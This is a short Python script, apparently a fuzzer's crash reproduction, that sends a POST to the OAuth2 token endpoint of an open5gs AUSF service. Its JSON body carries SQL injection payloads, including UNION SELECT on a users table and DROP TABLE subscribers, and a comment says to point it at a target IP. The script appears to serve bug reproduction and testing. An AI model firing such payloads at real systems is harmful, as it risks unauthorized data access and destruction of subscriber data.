#!/usr/bin/env python3
# Crash reproduction for open5gs-ausf (info)
# Detected: Sat May  9 00:43:18 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'POST'
path = '/nnrf-nfm/v1/oauth2/token'
body = b'{"grant_type": "1\' UNION SELECT * FROM users--", "nfInstanceId": "1\' UNION SELECT * FROM users--", "scope": "\'; DROP TABLE subscribers; --"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
